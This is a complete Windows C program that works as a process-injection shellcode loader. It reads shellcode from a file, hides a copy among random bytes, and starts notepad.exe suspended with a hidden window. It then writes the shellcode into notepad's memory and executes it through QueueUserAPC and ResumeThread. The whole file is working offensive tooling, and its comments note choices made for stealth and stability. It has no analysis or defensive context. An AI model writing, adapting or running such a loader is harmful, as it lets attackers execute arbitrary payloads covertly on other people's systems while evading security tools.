#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wincrypt.h>
#include <stdlib.h>

// Function to generate random cryptographic data
void GenerateRandomData(unsigned char* buffer, size_t size) {
    HCRYPTPROV hCryptProv = 0;
    if (!CryptAcquireContextW(&hCryptProv, NULL, NULL, PROV_RSA_FULL, 0)) {
        fprintf(stderr, "[ERROR] CryptAcquireContextW failed: %lu\n", GetLastError());
        return;
    }

    if (!CryptGenRandom(hCryptProv, (DWORD)size, buffer)) {
        fprintf(stderr, "[ERROR] CryptGenRandom failed: %lu\n", GetLastError());
    }

    CryptReleaseContext(hCryptProv, 0);
}

// Function to hide shellcode in a large memory space
LPVOID HideShellcode(const unsigned char* shellcode, size_t shellcodeSize) {
    size_t memorySize = 1024 * 1024; // 1MB
    LPVOID memory = VirtualAlloc(NULL, memorySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!memory) {
        fprintf(stderr, "[ERROR] VirtualAlloc failed: %lu\n", GetLastError());
        return NULL;
    }

    unsigned char* buffer = (unsigned char*)memory;
    for (size_t i = 0; i < memorySize; i += 16) {
        GenerateRandomData(buffer + i, (i + 16 <= memorySize) ? 16 : memorySize - i);
    }

    size_t offset = rand() % (memorySize - shellcodeSize);
    memcpy(buffer + offset, shellcode, shellcodeSize);

    return memory;
}

// Function to read shellcode from a file (using fopen_s instead of fopen)
unsigned char* ReadShellcode(const char* fileName, size_t* shellcodeSize) {
    FILE* file = nullptr;
    if (fopen_s(&file, fileName, "rb") != 0) {
        fprintf(stderr, "[ERROR] Failed to open shellcode file: %s\n", fileName);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *shellcodeSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(*shellcodeSize);
    if (!buffer) {
        fprintf(stderr, "[ERROR] Memory allocation failed for shellcode\n");
        fclose(file);
        return NULL;
    }

    if (fread(buffer, 1, *shellcodeSize, file) != *shellcodeSize) {
        fprintf(stderr, "[ERROR] Failed to read shellcode from file\n");
        free(buffer);
        fclose(file);
        return NULL;
    }

    fclose(file);
    return buffer;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <shellcode_file>\n", argv[0]);
        return 1;
    }

    size_t shellcodeSize = 0;
    unsigned char* shellcode = ReadShellcode(argv[1], &shellcodeSize);
    if (!shellcode) {
        return 1;
    }

    LPVOID hiddenShellcode = HideShellcode(shellcode, shellcodeSize);
    if (!hiddenShellcode) {
        free(shellcode);
        return 1;
    }

    // Create a suspended process (using Notepad instead of werfault.exe for stability)
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi = { 0 };

    // Set the dwFlags in STARTUPINFO to hide the window
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hide the window

    if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[ERROR] CreateProcess failed: %lu\n", GetLastError());
        VirtualFree(hiddenShellcode, 0, MEM_RELEASE);
        free(shellcode);
        return 1;
    }
    else {
        printf("[INFO] Process created successfully: %lu\n", pi.dwProcessId);
    }

    // Allocate memory for the shellcode in the target process
    LPVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        fprintf(stderr, "[ERROR] VirtualAllocEx failed: %lu\n", GetLastError());
        VirtualFree(hiddenShellcode, 0, MEM_RELEASE);
        free(shellcode);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    else {
        printf("[INFO] Memory allocated in target process at: %p\n", remoteShellcode);
    }

    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(pi.hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        fprintf(stderr, "[ERROR] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        VirtualFree(hiddenShellcode, 0, MEM_RELEASE);
        free(shellcode);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    else {
        printf("[INFO] Shellcode written to target process memory\n");
    }

    // Clean up sensitive shellcode data
    SecureZeroMemory(shellcode, shellcodeSize);
    free(shellcode);

    // Instead of immediately resuming, use QueueUserAPC to execute the shellcode
    if (!QueueUserAPC((PAPCFUNC)remoteShellcode, pi.hThread, NULL)) {
        fprintf(stderr, "[ERROR] QueueUserAPC failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        VirtualFree(hiddenShellcode, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    else {
        printf("[INFO] APC queued to target process thread\n");
    }

    // Resume the target process thread to execute the shellcode immediately
    if (ResumeThread(pi.hThread) == -1) {
        fprintf(stderr, "[ERROR] ResumeThread failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        VirtualFree(hiddenShellcode, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    else {
        printf("[INFO] Target process thread resumed\n");
    }

    // Clean up
    VirtualFree(hiddenShellcode, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
